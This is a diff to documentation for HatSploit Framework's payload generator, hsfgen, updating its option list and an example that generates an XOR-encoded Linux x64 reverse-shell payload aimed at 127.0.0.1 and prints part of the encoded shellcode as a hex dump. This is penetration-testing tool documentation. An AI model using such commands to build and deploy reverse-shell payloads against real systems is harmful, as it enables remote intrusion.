@@ -13,11 +13,11 @@ HatSploit Framework has a native command-line payload generator called `hsfgen`.
 usage: hsfgen [-h] [-p PAYLOAD] [-e ENCODER] [--platform PLATFORM]
               [--arch ARCH] [-f FORMAT] [--formats] [--payloads] [--encoders]
               [--options option1=value1,option2=value2,...] [-i ITERATIONS]
-              [-b BADCHARS] [--pack] [--implant] [-o OUTPUT] [-c CUSTOM]
+              [-b BADCHARS] [--pack] [--implant] [-a] [-o OUTPUT]
 
 Native HatSploit Framework advanced payload generator.
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
   -p PAYLOAD, --payload PAYLOAD
                         HatSploit payload.
@@ -36,13 +36,11 @@ optional arguments:
                         Number of encoding iterations.
   -b BADCHARS, --badchars BADCHARS
                         Bad characters to omit (e.g. \x00).
-  --pack                Pack payload as ELF, PE or Mach-O depending on
-                        platform.
+  --pack                Pack payload as a compatible executable format.
   --implant             Output implant instead of complete payload.
+  -a, --assembly        Show assembly for payloads.
   -o OUTPUT, --output OUTPUT
                         Output file to write payload to.
-  -c CUSTOM, --custom CUSTOM
-                        Specify custom payloads path.
 ```
 
 ### Generate payload
@@ -74,10 +72,10 @@ hsfgen -p linux/x64/shell_reverse_tcp --options rhost=127.0.0.1,rport=8888 -e x6
 
 The output of this code will be:
 
-```
+```hsf
 [*] Attempting to generate linux/x64/shell_reverse_tcp...
 [i] Payload will be encoded with x64/xor
-[*] Writing raw payload...
+[*] Writing raw payload (112 bytes)...
 00000000  48 31 c9 48 81 e9 b6 ff  ff ff 48 8d 05 ef ff ff |H1.H......H.....|
 00000010  ff 48 bb 68 61 74 73 70  6c 36 34 48 31 58 27 48 |.H.hatspl64H1X'H|
 00000020  2d f8 ff ff ff e2 f4 02  48 2c ea 1a 6e 69 5e 69 |-.......H,..ni^i|
@@ -90,4 +88,4 @@ The output of this code will be:
 
 If you'd like to save it to the file call it with `-o`.
 
-If you wish to pack it into `ELF` so it could be executed in the future, call `--pack`.
+If you wish to pack it into `ELF` so it could be executed in the future, call `--pack` or `-f elf`.
